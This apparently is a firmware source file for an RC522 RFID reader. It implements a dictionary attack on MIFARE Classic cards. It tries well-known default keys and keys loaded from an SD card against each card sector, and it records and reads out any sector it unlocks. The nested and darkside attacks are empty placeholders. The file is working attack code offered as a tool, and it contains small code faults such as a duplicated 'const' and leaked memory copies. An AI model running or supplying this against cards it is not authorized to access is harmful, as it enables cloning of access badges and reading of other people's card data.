#include "attacks/dictionary_attack.h"
#include "hal/card_comm.h"
#include "core/key_store.h"
#include "output/serial_reporter.h"
#include "config.h"
#include <SD.h>
#include <vector>

static const uint8_t BUILTIN_KEYS[][6] = {
    {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF},
    {0xA0,0xA1,0xA2,0xA3,0xA4,0xA5},
    {0xD3,0xF7,0xD3,0xF7,0xD3,0xF7}
};
static const const char* BUILTIN_KEYS_HEX[] = {"FFFFFFFFFFFF","A0A1A2A3A4A5","D3F7D3F7D3F7"};

static void _tryKey(CardDump* d, uint8_t sector, const uint8_t* key, const char* hex, bool isA) {
    uint8_t trailer = ks_sectorToTrailer(sector);
    reporter_attackStart("dictionary", sector, isA?"A":"B");
    RC522Status st = picc_mfAuth(isA?MF_AUTH_KEY_A:MF_AUTH_KEY_B, trailer, key, &d->uid);
    if (st==RC522_OK) {
        // read first block
        uint8_t buf[16];
        if (picc_mfRead(ks_sectorToFirstBlock(sector), buf)==RC522_OK) {
            if (isA) ks_setKeyA(d, sector, key); else ks_setKeyB(d, sector, key);
            reporter_keyFound(sector, isA?"A":"B", key, "dictionary");
            reporter_dataRead(sector, ks_sectorToFirstBlock(sector), buf);
        }
        picc_mfDeauth();
    } else {
        reporter_keyFailed(sector, isA?"A":"B");
    }
}

void dictAttack_run(CardDump* d) {
    // build key list: builtin + sd
    std::vector<std::pair<const uint8_t*, const char*>> keys;
    for (int i=0;i< (int)(sizeof(BUILTIN_KEYS)/6); i++) keys.push_back({BUILTIN_KEYS[i], BUILTIN_KEYS_HEX[i]});
    if (SD.begin(PIN_SS)) {
        File f = SD.open(DICT_PATH);
        if (f) {
            while (f.available()) {
                String line = f.readStringUntil('\n');
                line.trim();
                if (line.length()==12) {
                    static uint8_t kbuf[6];
                    for (int i=0;i<6;i++) kbuf[i] = (uint8_t) strtoul(line.substring(i*2, i*2+2).c_str(), NULL, 16);
                    // store a copy
                    uint8_t* kop = (uint8_t*)malloc(6);
                    memcpy(kop,kbuf,6);
                    keys.push_back({kop, strdup(line.c_str())});
                }
            }
            f.close();
        }
    }

    for (uint8_t s=0; s<d->totalSectors; s++) {
        if (ks_isSectorKnown(d,s)) continue;
        for (auto &kp: keys) {
            _tryKey(d, s, kp.first, kp.second, true);
            if (ks_isSectorKnown(d,s)) break;
            _tryKey(d, s, kp.first, kp.second, false);
            if (ks_isSectorKnown(d,s)) break;
        }
    }
}

void nestedAttack_run(CardDump* d) {
    // Placeholder: real nested attack implementation is complex and requires crypto1
    reporter_error("NESTED_TODO", "Nested attack not implemented — requires crypto1 integration");
}

void darksideAttack_runSector(CardDump* d, uint8_t sector) {
    reporter_error("DARKSIDE_TODO", "Darkside attack not implemented — placeholder");
}
